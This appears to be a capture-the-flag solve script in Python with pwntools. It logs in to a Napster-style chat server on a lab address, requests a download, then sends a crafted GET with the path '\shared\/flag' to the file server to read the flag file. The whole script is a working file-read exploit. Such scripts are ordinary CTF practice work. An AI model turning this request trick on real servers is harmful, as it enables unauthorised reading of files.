import pwn
import time
from enum import IntEnum


def send(msg: bytes, type: int):
    p = pwn.p16(len(msg)) + pwn.p16(type) + msg
    io.send(p)
    res = io.clean(timeout=0.5)
    print(f"[*] Response: {res}")


class Type(IntEnum):
    LOGIN = 2
    JOIN_CHANNEL = 0x190
    PUBLIC_MSG = 0x192
    DOWNLOAD_REQUEST = 0xCB


# We need to request a download before the file server on port 7070 will let us
# download anything
io = pwn.remote("192.168.5.1", 8888)
send(b'leo wmtidxal 0 "nap v1.5.4" 4', Type.LOGIN)
send(b"#chat", Type.JOIN_CHANNEL)
send(b"#chat hello", Type.PUBLIC_MSG)
send(r'nooopster "\shared\nooopster"'.encode(), Type.DOWNLOAD_REQUEST)

io = pwn.remote("192.168.5.1", 7070)
io.send(r'GETleo "\shared\/flag" 0')
io.interactive()